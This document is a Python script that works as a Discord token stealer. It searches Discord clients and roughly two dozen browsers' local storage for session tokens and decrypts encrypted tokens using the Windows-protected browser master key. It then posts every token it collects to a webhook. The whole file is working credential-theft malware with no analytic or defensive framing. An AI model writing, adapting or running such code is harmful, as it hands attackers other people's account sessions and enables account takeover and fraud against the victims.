import os
import re
import json
import base64
import requests
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData
tokens = []
appdata = os.getenv("LOCALAPPDATA")
roaming = os.getenv("APPDATA")
paths = {'Discord': roaming + '\\discord\\Local Storage\\leveldb\\', 'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\', 'Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\', 'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb\\', 'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\', 'Opera GX': roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\', 'Amigo': appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\', 'Torch': appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\', 'Kometa': appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\', 'Orbitum': appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\', 'CentBrowser': appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\', '7Star': appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\', 'Sputnik': appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\', 'Vivaldi': appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\', 'Chrome SxS': appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\', 'Chrome': appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\', 'Chrome1': appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\', 'Chrome2': appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\', 'Chrome3': appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\', 'Chrome4': appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\', 'Chrome5': appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\', 'Epic Privacy Browser': appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\', 'Microsoft Edge': appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\', 'Uran': appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\', 'Yandex': appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\', 'Brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\', 'Iridium': appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\', 'Vesktop': roaming + '\\vesktop\\sessionData\\Local Storage\\leveldb\\'}
def d3crypt(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception:
        return "Failed to decrypt password"
def k3y(path):
    with open(path, "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key
def gr4b():
    for name, path in paths.items():
        if not os.path.exists(path):
            continue
        disc = name.replace(" ", "").lower()
        if "cord" in path:
            if os.path.exists(roaming + f'\\{disc}\\Local State'):
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                            token = d3crypt(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), k3y(roaming + f'\\{disc}\\Local State'))
                            tokens.append(token)
        else:
            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]:
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for token in re.findall(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}", line):
                        tokens.append(token)
gr4b()
requests.post("webhook", json={"content": "```"+str(tokens).replace(", ", "\n").replace("'", "").replace("[", "").replace("]", "")+"```"})
